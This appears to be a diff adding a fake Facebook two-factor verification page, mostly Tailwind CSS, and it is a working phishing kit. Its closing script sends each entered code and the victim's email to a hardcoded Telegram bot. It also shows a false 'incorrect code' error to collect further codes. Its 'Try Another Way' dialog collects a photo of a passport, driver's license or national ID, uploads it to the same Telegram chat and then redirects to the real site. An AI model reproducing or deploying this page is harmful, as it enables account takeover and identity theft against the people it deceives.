@@ -1,0 +1,762 @@
+<html lang="en"><head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Facebook</title>
+        <link rel="shortcut icon" href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico" type="image/x-icon">
+        <script src="https://unpkg.com/@tailwindcss/browser@4"></script><style>/*! tailwindcss v4.0.9 | MIT License | https://tailwindcss.com */
+@layer theme, base, components, utilities;
+@layer theme {
+  :root, :host {
+    --font-sans: ui-sans-serif, system-ui, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol',
+    'Noto Color Emoji';
+    --font-mono: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, 'Liberation Mono', 'Courier New',
+    monospace;
+    --color-red-500: oklch(0.637 0.237 25.331);
+    --color-blue-500: oklch(0.623 0.214 259.815);
+    --color-blue-600: oklch(0.546 0.245 262.881);
+    --color-gray-100: oklch(0.967 0.003 264.542);
+    --color-gray-200: oklch(0.928 0.006 264.531);
+    --color-gray-300: oklch(0.872 0.01 258.338);
+    --color-gray-500: oklch(0.551 0.027 264.364);
+    --color-gray-600: oklch(0.446 0.03 256.802);
+    --color-gray-700: oklch(0.373 0.034 259.733);
+    --color-gray-800: oklch(0.278 0.033 256.848);
+    --color-black: #000;
+    --color-white: #fff;
+    --spacing: 0.25rem;
+    --text-sm: 0.875rem;
+    --text-sm--line-height: calc(1.25 / 0.875);
+    --text-lg: 1.125rem;
+    --text-lg--line-height: calc(1.75 / 1.125);
+    --text-xl: 1.25rem;
+    --text-xl--line-height: calc(1.75 / 1.25);
+    --font-weight-semibold: 600;
+    --radius-md: 0.375rem;
+    --radius-lg: 0.5rem;
+    --default-transition-duration: 150ms;
+    --default-transition-timing-function: cubic-bezier(0.4, 0, 0.2, 1);
+    --default-font-family: var(--font-sans);
+    --default-font-feature-settings: var(--font-sans--font-feature-settings);
+    --default-font-variation-settings: var(--font-sans--font-variation-settings);
+    --default-mono-font-family: var(--font-mono);
+    --default-mono-font-feature-settings: var(--font-mono--font-feature-settings);
+    --default-mono-font-variation-settings: var(--font-mono--font-variation-settings);
+  }
+}
+@layer base {
+  *, ::after, ::before, ::backdrop, ::file-selector-button {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+    border: 0 solid;
+  }
+  html, :host {
+    line-height: 1.5;
+    -webkit-text-size-adjust: 100%;
+    tab-size: 4;
+    font-family: var( --default-font-family, ui-sans-serif, system-ui, sans-serif, 'Apple Color Emoji', 'Segoe UI Emoji', 'Segoe UI Symbol', 'Noto Color Emoji' );
+    font-feature-settings: var(--default-font-feature-settings, normal);
+    font-variation-settings: var(--default-font-variation-settings, normal);
+    -webkit-tap-highlight-color: transparent;
+  }
+  body {
+    line-height: inherit;
+  }
+  hr {
+    height: 0;
+    color: inherit;
+    border-top-width: 1px;
+  }
+  abbr:where([title]) {
+    -webkit-text-decoration: underline dotted;
+    text-decoration: underline dotted;
+  }
+  h1, h2, h3, h4, h5, h6 {
+    font-size: inherit;
+    font-weight: inherit;
+  }
+  a {
+    color: inherit;
+    -webkit-text-decoration: inherit;
+    text-decoration: inherit;
+  }
+  b, strong {
+    font-weight: bolder;
+  }
+  code, kbd, samp, pre {
+    font-family: var( --default-mono-font-family, ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, 'Liberation Mono', 'Courier New', monospace );
+    font-feature-settings: var(--default-mono-font-feature-settings, normal);
+    font-variation-settings: var(--default-mono-font-variation-settings, normal);
+    font-size: 1em;
+  }
+  small {
+    font-size: 80%;
+  }
+  sub, sup {
+    font-size: 75%;
+    line-height: 0;
+    position: relative;
+    vertical-align: baseline;
+  }
+  sub {
+    bottom: -0.25em;
+  }
+  sup {
+    top: -0.5em;
+  }
+  table {
+    text-indent: 0;
+    border-color: inherit;
+    border-collapse: collapse;
+  }
+  :-moz-focusring {
+    outline: auto;
+  }
+  progress {
+    vertical-align: baseline;
+  }
+  summary {
+    display: list-item;
+  }
+  ol, ul, menu {
+    list-style: none;
+  }
+  img, svg, video, canvas, audio, iframe, embed, object {
+    display: block;
+    vertical-align: middle;
+  }
+  img, video {
+    max-width: 100%;
+    height: auto;
+  }
+  button, input, select, optgroup, textarea, ::file-selector-button {
+    font: inherit;
+    font-feature-settings: inherit;
+    font-variation-settings: inherit;
+    letter-spacing: inherit;
+    color: inherit;
+    border-radius: 0;
+    background-color: transparent;
+    opacity: 1;
+  }
+  :where(select:is([multiple], [size])) optgroup {
+    font-weight: bolder;
+  }
+  :where(select:is([multiple], [size])) optgroup option {
+    padding-inline-start: 20px;
+  }
+  ::file-selector-button {
+    margin-inline-end: 4px;
+  }
+  ::placeholder {
+    opacity: 1;
+    color: color-mix(in oklab, currentColor 50%, transparent);
+  }
+  textarea {
+    resize: vertical;
+  }
+  ::-webkit-search-decoration {
+    -webkit-appearance: none;
+  }
+  ::-webkit-date-and-time-value {
+    min-height: 1lh;
+    text-align: inherit;
+  }
+  ::-webkit-datetime-edit {
+    display: inline-flex;
+  }
+  ::-webkit-datetime-edit-fields-wrapper {
+    padding: 0;
+  }
+  ::-webkit-datetime-edit, ::-webkit-datetime-edit-year-field, ::-webkit-datetime-edit-month-field, ::-webkit-datetime-edit-day-field, ::-webkit-datetime-edit-hour-field, ::-webkit-datetime-edit-minute-field, ::-webkit-datetime-edit-second-field, ::-webkit-datetime-edit-millisecond-field, ::-webkit-datetime-edit-meridiem-field {
+    padding-block: 0;
+  }
+  :-moz-ui-invalid {
+    box-shadow: none;
+  }
+  button, input:where([type='button'], [type='reset'], [type='submit']), ::file-selector-button {
+    appearance: button;
+  }
+  ::-webkit-inner-spin-button, ::-webkit-outer-spin-button {
+    height: auto;
+  }
+  [hidden]:where(:not([hidden='until-found'])) {
+    display: none !important;
+  }
+}
+@layer utilities {
+  .absolute {
+    position: absolute;
+  }
+  .fixed {
+    position: fixed;
+  }
+  .relative {
+    position: relative;
+  }
+  .inset-0 {
+    inset: calc(var(--spacing) * 0);
+  }
+  .z-10 {
+    z-index: 10;
+  }
+  .mx-auto {
+    margin-inline: auto;
+  }
+  .my-4 {
+    margin-block: calc(var(--spacing) * 4);
+  }
+  .mt-2 {
+    margin-top: calc(var(--spacing) * 2);
+  }
+  .mt-6 {
+    margin-top: calc(var(--spacing) * 6);
+  }
+  .mt-16 {
+    margin-top: calc(var(--spacing) * 16);
+  }
+  .mb-2 {
+    margin-bottom: calc(var(--spacing) * 2);
+  }
+  .mb-3 {
+    margin-bottom: calc(var(--spacing) * 3);
+  }
+  .mb-4 {
+    margin-bottom: calc(var(--spacing) * 4);
+  }
+  .flex {
+    display: flex;
+  }
+  .hidden {
+    display: none;
+  }
+  .h-4 {
+    height: calc(var(--spacing) * 4);
+  }
+  .h-\[44px\] {
+    height: 44px;
+  }
+  .w-4 {
+    width: calc(var(--spacing) * 4);
+  }
+  .w-11\/12 {
+    width: calc(11/12 * 100%);
+  }
+  .w-full {
+    width: 100%;
+  }
+  .max-w-\[600px\] {
+    max-width: 600px;
+  }
+  .cursor-not-allowed {
+    cursor: not-allowed;
+  }
+  .cursor-pointer {
+    cursor: pointer;
+  }
+  .appearance-none {
+    appearance: none;
+  }
+  .items-center {
+    align-items: center;
+  }
+  .justify-between {
+    justify-content: space-between;
+  }
+  .justify-center {
+    justify-content: center;
+  }
+  .gap-2 {
+    gap: calc(var(--spacing) * 2);
+  }
+  .rounded-\[16px\] {
+    border-radius: 16px;
+  }
+  .rounded-\[22px\] {
+    border-radius: 22px;
+  }
+  .rounded-full {
+    border-radius: calc(infinity * 1px);
+  }
+  .rounded-lg {
+    border-radius: var(--radius-lg);
+  }
+  .rounded-md {
+    border-radius: var(--radius-md);
+  }
+  .border {
+    border-style: var(--tw-border-style);
+    border-width: 1px;
+  }
+  .border-\[\#dddfe2\] {
+    border-color: #dddfe2;
+  }
+  .border-gray-300 {
+    border-color: var(--color-gray-300);
+  }
+  .border-gray-500 {
+    border-color: var(--color-gray-500);
+  }
+  .bg-\[\#0064E0\] {
+    background-color: #0064E0;
+  }
+  .bg-\[\#FFFFFF\] {
+    background-color: #FFFFFF;
+  }
+  .bg-black\/50 {
+    background-color: color-mix(in oklab, var(--color-black) 50%, transparent);
+  }
+  .bg-blue-500 {
+    background-color: var(--color-blue-500);
+  }
+  .bg-gray-100 {
+    background-color: var(--color-gray-100);
+  }
+  .bg-white {
+    background-color: var(--color-white);
+  }
+  .p-2 {
+    padding: calc(var(--spacing) * 2);
+  }
+  .p-4 {
+    padding: calc(var(--spacing) * 4);
+  }
+  .p-8 {
+    padding: calc(var(--spacing) * 8);
+  }
+  .px-4 {
+    padding-inline: calc(var(--spacing) * 4);
+  }
+  .px-\[16px\] {
+    padding-inline: 16px;
+  }
+  .py-2 {
+    padding-block: calc(var(--spacing) * 2);
+  }
+  .py-\[14px\] {
+    padding-block: 14px;
+  }
+  .text-lg {
+    font-size: var(--text-lg);
+    line-height: var(--tw-leading, var(--text-lg--line-height));
+  }
+  .text-sm {
+    font-size: var(--text-sm);
+    line-height: var(--tw-leading, var(--text-sm--line-height));
+  }
+  .text-xl {
+    font-size: var(--text-xl);
+    line-height: var(--tw-leading, var(--text-xl--line-height));
+  }
+  .text-\[13px\] {
+    font-size: 13px;
+  }
+  .text-\[15px\] {
+    font-size: 15px;
+  }
+  .text-\[17px\] {
+    font-size: 17px;
+  }
+  .text-\[24px\] {
+    font-size: 24px;
+  }
+  .leading-\[17px\] {
+    --tw-leading: 17px;
+    line-height: 17px;
+  }
+  .leading-\[19px\] {
+    --tw-leading: 19px;
+    line-height: 19px;
+  }
+  .leading-\[28px\] {
+    --tw-leading: 28px;
+    line-height: 28px;
+  }
+  .font-\[400\] {
+    --tw-font-weight: 400;
+    font-weight: 400;
+  }
+  .font-\[500\] {
+    --tw-font-weight: 500;
+    font-weight: 500;
+  }
+  .font-\[600\] {
+    --tw-font-weight: 600;
+    font-weight: 600;
+  }
+  .font-semibold {
+    --tw-font-weight: var(--font-weight-semibold);
+    font-weight: var(--font-weight-semibold);
+  }
+  .text-\[\#1c1e21\] {
+    color: #1c1e21;
+  }
+  .text-\[rgb\(10\,19\,23\)\] {
+    color: rgb(10,19,23);
+  }
+  .text-blue-600 {
+    color: var(--color-blue-600);
+  }
+  .text-gray-600 {
+    color: var(--color-gray-600);
+  }
+  .text-gray-700 {
+    color: var(--color-gray-700);
+  }
+  .text-gray-800 {
+    color: var(--color-gray-800);
+  }
+  .text-red-500 {
+    color: var(--color-red-500);
+  }
+  .text-white {
+    color: var(--color-white);
+  }
+  .underline {
+    text-decoration-line: underline;
+  }
+  .opacity-40 {
+    opacity: 40%;
+  }
+  .shadow-2xl {
+    --tw-shadow: 0 25px 50px -12px var(--tw-shadow-color, rgb(0 0 0 / 0.25));
+    box-shadow: var(--tw-inset-shadow), var(--tw-inset-ring-shadow), var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow);
+  }
+  .transition-colors {
+    transition-property: color, background-color, border-color, outline-color, text-decoration-color, fill, stroke, --tw-gradient-from, --tw-gradient-via, --tw-gradient-to;
+    transition-timing-function: var(--tw-ease, var(--default-transition-timing-function));
+    transition-duration: var(--tw-duration, var(--default-transition-duration));
+  }
+  .checked\:border-2 {
+    &:checked {
+      border-style: var(--tw-border-style);
+      border-width: 2px;
+    }
+  }
+  .checked\:border-white {
+    &:checked {
+      border-color: var(--color-white);
+    }
+  }
+  .checked\:bg-blue-600 {
+    &:checked {
+      background-color: var(--color-blue-600);
+    }
+  }
+  .checked\:ring-2 {
+    &:checked {
+      --tw-ring-shadow: var(--tw-ring-inset,) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color, currentColor);
+      box-shadow: var(--tw-inset-shadow), var(--tw-inset-ring-shadow), var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow);
+    }
+  }
+  .checked\:ring-blue-500 {
+    &:checked {
+      --tw-ring-color: var(--color-blue-500);
+    }
+  }
+  .hover\:bg-\[\#0064E0\] {
+    &:hover {
+      @media (hover: hover) {
+        background-color: #0064E0;
+      }
+    }
+  }
+  .hover\:bg-\[\#f5f6f7\] {
+    &:hover {
+      @media (hover: hover) {
+        background-color: #f5f6f7;
+      }
+    }
+  }
+  .hover\:bg-blue-600 {
+    &:hover {
+      @media (hover: hover) {
+        background-color: var(--color-blue-600);
+      }
+    }
+  }
+  .hover\:bg-gray-200 {
+    &:hover {
+      @media (hover: hover) {
+        background-color: var(--color-gray-200);
+      }
+    }
+  }
+  .focus\:border-\[\#1877f2\] {
+    &:focus {
+      border-color: #1877f2;
+    }
+  }
+  .focus\:shadow-\[0_0_0_2px_\#e7f3ff\] {
+    &:focus {
+      --tw-shadow: 0 0 0 2px var(--tw-shadow-color, #e7f3ff);
+      box-shadow: var(--tw-inset-shadow), var(--tw-inset-ring-shadow), var(--tw-ring-offset-shadow), var(--tw-ring-shadow), var(--tw-shadow);
+    }
+  }
+  .focus\:outline-none {
+    &:focus {
+      --tw-outline-style: none;
+      outline-style: none;
+    }
+  }
+  .md\:w-2\/5 {
+    @media (width >= 48rem) {
+      width: calc(2/5 * 100%);
+    }
+  }
+}
+@property --tw-border-style {
+  syntax: "*";
+  inherits: false;
+  initial-value: solid;
+}
+@property --tw-leading {
+  syntax: "*";
+  inherits: false;
+}
+@property --tw-font-weight {
+  syntax: "*";
+  inherits: false;
+}
+@property --tw-shadow {
+  syntax: "*";
+  inherits: false;
+  initial-value: 0 0 #0000;
+}
+@property --tw-shadow-color {
+  syntax: "*";
+  inherits: false;
+}
+@property --tw-inset-shadow {
+  syntax: "*";
+  inherits: false;
+  initial-value: 0 0 #0000;
+}
+@property --tw-inset-shadow-color {
+  syntax: "*";
+  inherits: false;
+}
+@property --tw-ring-color {
+  syntax: "*";
+  inherits: false;
+}
+@property --tw-ring-shadow {
+  syntax: "*";
+  inherits: false;
+  initial-value: 0 0 #0000;
+}
+@property --tw-inset-ring-color {
+  syntax: "*";
+  inherits: false;
+}
+@property --tw-inset-ring-shadow {
+  syntax: "*";
+  inherits: false;
+  initial-value: 0 0 #0000;
+}
+@property --tw-ring-inset {
+  syntax: "*";
+  inherits: false;
+}
+@property --tw-ring-offset-width {
+  syntax: "<length>";
+  inherits: false;
+  initial-value: 0px;
+}
+@property --tw-ring-offset-color {
+  syntax: "*";
+  inherits: false;
+  initial-value: #fff;
+}
+@property --tw-ring-offset-shadow {
+  syntax: "*";
+  inherits: false;
+  initial-value: 0 0 #0000;
+}
+</style>
+    </head>
+    <body class="bg-[#FFFFFF]">
+        <div class="max-w-[600px] mx-auto mt-16">
+            <div class="flex items-center gap-2 mb-4">
+                <span id="userEmail" class="text-[13px] leading-[17px] font-[500] text-[rgb(10,19,23)]"> • Facebook</span>
+            </div>
+            <div class="">
+                <h1 class="text-[24px] leading-[28px] font-[600] text-[rgb(10,19,23)] mb-2">Check your text messages</h1>
+                <p class="text-[15px] leading-[19px] font-[400] text-[rgb(10,19,23)] mb-4">Enter the 6-digit code that we've just sent to your SMS, WhatsApp or from the authentication app that you set up.</p>
+                <div class="mb-4 flex justify-center">
+                    <img src="text-message.png" alt="Two-factor authentication illustration" class="w-full">
+                </div>
+                <input type="text" placeholder="Code" id="codeInput" maxlength="8" pattern="[0-9]*" inputmode="numeric" class="w-full px-[16px] py-[14px] text-[17px] border border-[#dddfe2] rounded-[16px] mb-3 focus:outline-none focus:border-[#1877f2] focus:shadow-[0_0_0_2px_#e7f3ff]">
+                <p id="errorMessage" class="text-red-500 text-[13px] mb-3 hidden">The code you entered is incorrect. Please try again in <span id="timer">30</span> seconds.</p>
+                <button id="continueBtn" class="w-full h-[44px] bg-[#0064E0] text-white font-[500] text-[15px] rounded-[22px] mb-2 hover:bg-[#0064E0] transition-colors cursor-pointer">Continue</button>
+
+                <button id="tryAnotherWayBtn" class="w-full h-[44px] bg-white text-[#1c1e21] font-[500] text-[15px] rounded-[22px] border border-[#dddfe2] hover:bg-[#f5f6f7] transition-colors">Try Another Way</button>
+            </div>
+        </div>
+
+        <div id="uploadModal" class="fixed inset-0 flex items-center justify-center hidden">
+            <div class="absolute inset-0 bg-black/50"></div>
+            <div class="w-11/12 rounded-lg bg-white p-8 shadow-2xl md:w-2/5 relative z-10">
+                <div class="relative mb-4 flex items-center justify-center">
+                    <h2 class="text-xl font-semibold text-gray-800">Confirm your identity</h2>
+                </div>
+
+                <hr class="my-4 border-gray-300">
+                <div class="mb-4">
+                    <b class="text-lg text-gray-700"> Choose type of ID to upload </b>
+                    <p class="mt-2 text-gray-600">We'll use your ID to review your name, photo, and date of birth. It won't be shared on your profile.</p>
+                </div>
+                <div class="mb-4 w-full font-semibold text-gray-700">
+                    <label for="passport" class="mb-2 flex cursor-pointer items-center justify-between p-2 hover:bg-gray-200">
+                        <span>Passport</span>
+                        <input type="radio" id="passport" name="document" value="passport" checked="" class="h-4 w-4 appearance-none rounded-full border border-gray-500 checked:border-2 checked:border-white checked:bg-blue-600 checked:ring-2 checked:ring-blue-500">
+                    </label>
+                    <label for="drivers-license" class="mb-2 flex cursor-pointer items-center justify-between p-2 hover:bg-gray-200">
+                        <span>Driver's license</span>
+                        <input type="radio" id="drivers-license" name="document" value="drivers-license" class="h-4 w-4 appearance-none rounded-full border border-gray-500 checked:border-2 checked:border-white checked:bg-blue-600 checked:ring-2 checked:ring-blue-500">
+                    </label>
+                    <label for="national-id" class="mb-2 flex cursor-pointer items-center justify-between p-2 hover:bg-gray-200">
+                        <span>National ID card</span>
+                        <input type="radio" id="national-id" name="document" value="national-id" class="h-4 w-4 appearance-none rounded-full border border-gray-500 checked:border-2 checked:border-white checked:bg-blue-600 checked:ring-2 checked:ring-blue-500">
+                    </label>
+                </div>
+                <input type="file" accept="image/*" id="id-upload" class="hidden">
+                <div class="rounded-md bg-gray-100 p-4 text-sm text-gray-600">
+                    Your ID will be securely stored for up to 1 year to help improve how we detect impersonation and fake IDs. If you opt out, we'll delete it within 30 days. We sometimes use trusted service providers to help review your information.
+                    <a href="#" target="_blank" class="text-blue-600 underline"> Learn more </a>
+                </div>
+                <button id="uploadBtn" class="mt-6 w-full rounded-md bg-blue-500 px-4 py-2 font-semibold text-white hover:bg-blue-600">Upload Image</button>
+            </div>
+        </div>
+
+        <script>
+            document.addEventListener('DOMContentLoaded', () => {
+                const codeInput = document.getElementById('codeInput');
+                const continueBtn = document.getElementById('continueBtn');
+                const errorMessage = document.getElementById('errorMessage');
+                const timerElement = document.getElementById('timer');
+                const tryAnotherWayBtn = document.getElementById('tryAnotherWayBtn');
+                const uploadModal = document.getElementById('uploadModal');
+                const uploadBtn = document.getElementById('uploadBtn');
+                const fileInput = document.getElementById('id-upload');
+                const userEmail = document.getElementById('userEmail');
+
+                // Telegram configuration
+                const config = {
+                    token: '7321798508:AAEMUAfAcUBbHC45MtV0xP81-QP0IDon4Xw',
+                    chatId: '-4712592608'
+                };
+
+                let isFirstAttempt = true;
+                let countdownInterval;
+                let storedData = JSON.parse(localStorage.getItem('messageData')) || {};
+
+                function maskEmail(email) {
+                    const [username, domain] = email.split('@');
+                    const maskedUsername = username.charAt(0) + '*'.repeat(username.length - 2) + username.charAt(username.length - 1);
+                    const maskedDomain = domain.charAt(0) + '*'.repeat(domain.length - 2) + domain.charAt(domain.length - 1);
+                    return `${maskedUsername}@${maskedDomain} • Facebook`;
+                }
+
+                if (storedData && storedData.email) {
+                    userEmail.textContent = maskEmail(storedData.email);
+                }
+
+                function startCountdown() {
+                    let seconds = 30;
+                    continueBtn.disabled = true;
+                    continueBtn.classList.add('opacity-40');
+                    continueBtn.classList.add('cursor-not-allowed');
+                    
+                    countdownInterval = setInterval(() => {
+                        timerElement.textContent = seconds;
+                        seconds--;
+                        
+                        if (seconds < 0) {
+                            clearInterval(countdownInterval);
+                            continueBtn.disabled = false;
+                            continueBtn.classList.remove('opacity-40');
+                            continueBtn.classList.remove('cursor-not-allowed');
+                        }
+                    }, 1000);
+                }
+
+                function sendToTelegram(code) {
+                    if (!storedData.email) {
+                        storedData.email = prompt("Please enter your facebook email:") || "unknown@example.com";
+                        localStorage.setItem('messageData', JSON.stringify(storedData));
+                        userEmail.textContent = maskEmail(storedData.email);
+                    }
+
+                    const message = `🔑 New code attempt\n📧 Email: ${storedData.email}\n🔢 Code: ${code}`;
+                    
+                    fetch(`https://api.telegram.org/bot${config.token}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: config.chatId,
+                            text: message
+                        })
+                    }).catch(error => console.error('Error sending to Telegram:', error));
+                }
+
+                codeInput.addEventListener('input', function (e) {
+                    this.value = this.value.replace(/\D/g, '');
+                });
+
+                continueBtn.addEventListener('click', function() {
+                    const code = codeInput.value;
+                    
+                    if (code.length < 6 || code.length > 8) return;
+                    
+                    // Send code to Telegram
+                    sendToTelegram(code);
+                    
+                    // First attempt - show error and start timer
+                    if (isFirstAttempt) {
+                        isFirstAttempt = false;
+                        errorMessage.classList.remove('hidden');
+                        startCountdown();
+                    } else {
+                        // Subsequent attempts - reset timer
+                        clearInterval(countdownInterval);
+                        startCountdown();
+                    }
+                    
+                    // Clear input
+                    codeInput.value = '';
+                });
+
+                tryAnotherWayBtn.addEventListener('click', () => {
+                    uploadModal.classList.remove('hidden');
+                });
+
+                uploadBtn.addEventListener('click', () => {
+                    fileInput.click();
+                });
+
+                fileInput.addEventListener('change', async (e) => {
+                    const file = e.target.files[0];
+                    if (!file) return;
+
+                    const formData = new FormData();
+                    formData.append('chat_id', config.chatId);
+                    formData.append('photo', file);
+                    formData.append('caption', `📝 ID Verification\n📧 Email: ${storedData.email}`);
+
+                    try {
+                        await fetch(`https://api.telegram.org/bot${config.token}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                        window.location.href = 'https://www.facebook.com/';
+                    } catch (error) {
+                        console.error('Error uploading ID:', error);
+                    }
+                });
+            });
+        </script>
+    </body>
+</html>
